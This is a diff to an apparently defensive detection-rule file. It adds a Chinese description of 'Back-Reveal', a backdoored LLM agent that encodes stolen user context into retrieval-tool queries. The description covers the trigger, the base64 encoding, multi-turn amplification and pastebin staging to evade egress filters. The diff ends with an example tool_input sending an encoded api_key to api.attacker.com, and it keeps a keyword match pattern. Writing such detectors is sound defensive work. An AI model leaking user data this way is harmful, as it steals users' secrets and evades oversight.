@@ -90,3 +90,15 @@ sql_template: |
         AND match(lower(tool_input), '(context|data|payload|session|token|dump|secret)')
       )
     )
+translations:
+  zh-CN:
+    name: "Back-Reveal 后门检索工具数据外泄检测器"
+    description: |
+      检测 Back-Reveal(arXiv:2604.05432,ACL 2026)——一种数据外泄攻击,后门化的经过微调的 LLM 智能体利用检索/搜索/文档工具,将窃取的用户上下文编码进发送至攻击者控制服务器的出站 HTTP 请求中,这些服务器伪装成合法的知识库 API。在语义激活器触发下,后门智能体(1)通过记忆访问类工具调用读取用户记忆/上下文,然后(2)将提取的数据编码进检索工具调用参数中(在 "context"、"metadata"、"uid"、"tok" 等查询参数中使用 base64 编码;在搜索查询中携带 JWT 令牌;在请求头中携带长编码字符串)。多轮放大效应:攻击者服务器返回精心构造的响应,引导智能体后续行为泄露更多敏感数据。
+
+      不同于 rp-017(ToolLeak:用于 RCE/系统提示词泄露的 MCP 工具描述注入)和 rp-007(SSRF:云元数据端点)。Back-Reveal 利用检索工具的出站 HTTP 访问作为外泄通道,将数据编码进查询参数,而非针对内部端点。v0.2.0:新增 Signal 6——pastebin/gist/transfer.sh 暂存外泄变体:后门智能体在被攻击者服务器获取之前,先将编码后的载荷暂存到公开粘贴网站。该规避手法避免了可能被出站过滤规则拦截的直接攻击者服务器调用。已验证 SQL 在语料库上返回 0(现有事件无误报)。
+
+      References: arXiv:2604.05432 Back-Reveal (ACL 2026), OWASP LLM06:2025 (Excessive Agency), OWASP LLM02:2025 -
+      - https://arxiv.org/abs/2604.05432,
+      - https://owasp.org/www-project-top-10-for-large-language-model-applications/,
+      Example: tool_input to knowledge_search={"context": "eyJ1c2VybmFtZSI6ICJhbGljZSIsICJhcGlfa2V5IjogInNrLWFudC1YWFgifQ==", "endpoint": "https://api.attacker.com/kb"} (base64-encoded user context smuggled as search parameter)
